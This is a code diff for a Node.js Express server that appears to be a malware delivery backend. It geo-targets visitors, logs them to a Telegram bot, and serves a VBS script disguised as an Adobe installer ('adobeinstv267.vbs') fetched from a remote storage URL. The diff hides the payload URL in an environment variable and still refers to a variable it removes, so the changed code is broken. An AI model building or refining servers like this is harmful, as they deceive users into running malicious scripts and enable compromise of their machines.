@@ -5,6 +5,7 @@ const path = require('path');
 const helmet = require('helmet');
 const geoip = require('geoip-lite');
 const rateLimit = require('express-rate-limit');
+const axios = require('axios');
 require('dotenv').config();
 
 // const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));
@@ -15,26 +16,29 @@ const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
 const TARGET_COUNTRY = process.env.TARGET_COUNTRY || ''; // e.g., 'US'
 const DOMAIN = process.env.DOMAIN || '';
+const FANTA = process.env.FANTA || '';
 
 const requestTimestamps = new Map();
+
 
 // ======= Telegram Logging =======
 async function sendTelegramMessage(text) {
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
   try {
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    await fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text})
+    await axios.post(url, {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: text
+    }, {
+      timeout: 5000,
+      headers: { 'Content-Type': 'application/json' }
     });
   } catch (err) {
-    console.dir(err, { depth: null });
-}
+    console.log('⚠️ Telegram error (non-critical):', err.message || 'failed');
+  }
 }
 
 function log(level, meta = {}) {
-
   const icons = {
     info: "🟢",
     warn: "🟡",
@@ -230,7 +234,7 @@ function isTargetCountry(req) {
 }
 
 // ======= Middleware =======
-app.set('trust proxy', 2);
+app.set('trust proxy', 1);
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 app.use('/images', express.static(path.join(__dirname, 'pages', 'images')));
@@ -296,7 +300,9 @@ app.use((req, res, next) => {
 app.get('/download/vbs/:type', apiLimiter, async (req, res) => {
     try {
         const { type } = req.params;
-        const vbsUrl = 'https://pub-05a36c67a70d476394cc0b8a3f67777f.r2.dev/adobeinstv267.vbs';
+        // const FANTA = 'https://pub-05a36c67a70d476394cc0b8a3f67777f.r2.dev/adobeinstv267.vbs';
+        const FANTA = process.env.FANTA || '';
+        
         
         const response = await fetch(vbsUrl);
         const data = await response.text();
@@ -392,10 +398,10 @@ app.get('/health', (req, res) => {
 });
 
 // ======= Error handling =======
-// app.use((err, req, res, next) => {
-//   log('error', { event: 'internal_error', ip: getClientIp(req), reason: err?.message });
-//   res.status(500).send('Internal Server Error');
-// });
+app.use((err, req, res, next) => {
+  log('error', { event: 'internal_error', ip: getClientIp(req), reason: err?.message });
+  res.status(500).send('Internal Server Error');
+});
 
 // ======= Start server =======
 app.listen(PORT, "0.0.0.0",() => {
